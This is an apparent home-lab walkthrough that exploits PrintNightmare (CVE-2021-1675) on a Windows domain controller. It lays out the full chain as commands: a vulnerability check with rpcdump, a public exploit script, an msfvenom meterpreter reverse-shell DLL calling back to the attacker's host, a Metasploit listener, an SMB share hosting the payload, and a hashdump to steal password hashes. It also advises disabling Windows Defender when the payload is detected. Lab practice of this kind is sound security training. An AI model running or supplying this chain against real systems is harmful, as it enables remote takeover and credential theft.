# II. PrintNightmare (CVE-2021-1675) Walkthrough

PrintNightmare is a critical security flaw found in the Windows Print Spooler service, which manages print jobs sent to printers. It allows an attacker to execute remote code with system-level privileges on affected machines.

For this, we are going to use the resources found here https://github.com/cube0x0/CVE-2021-1675. 

To check if our DC is vulnerable to this attack:

`rpcdump.py @<DC-IP> | grep 'MS-RPRN|MS-PAR'`

```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

If we see the above after hitting `ENTER`, then the DC is vulnerable.

Before running the exploit, we need to install the latest version of impacket:

```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

Once thatâ€™s done.

Letâ€™s grab the actual exploit `https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py`.  We can copy the actual code, open a text document, paste the code and save it as a python file (Donâ€™t forget to add the `.py` extension).

Next to generate a malicious dll payload:

`mfsvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=4444 -f dll > shell.dll`.

Since, weâ€™re using msfvenom for the payloadâ€¦.

Weâ€™ll start up `msfconsole` and `use exploit multi/handler` for the meterpreter session:

`set payload windows/x64/meterpreter/reverse_tcp`

`set LPORT 4444`

`set LHOST <KALI-IP>`

`run`

Now open up a new terminal window, to set up a smbserver using impacket to host the `shell.dll` payload.

`smbserver.py share 'pwd'` (Make sure to run this in the same directory as the payload).

Everything is set up. Time to run the exploit.

`python3 CVE-2021-1675.py <DOMAIN>/<user>:<pass>@<DC-IP>@<DC-IP> '\\<KALI-IP>\share\shell.dll'`

**NOTE: If thereâ€™s an error, try running smbserver.py with the `-smb2support` tag.  AND if upon running we get a `ERROR_VIRUS_INFECTED` notification, login into the Domain Controller and disable Windows Defender.**

Back in msfconsole, we should a meterpreter shell. We can do anything now such as using the `hashdump` command to dump the hashes.

**NOTE: Wellâ€¦This one failed as well, discovered I forgot to disable Windows Updater on all 3 Windows machines**. **Please donâ€™t be like me ðŸ«£.**
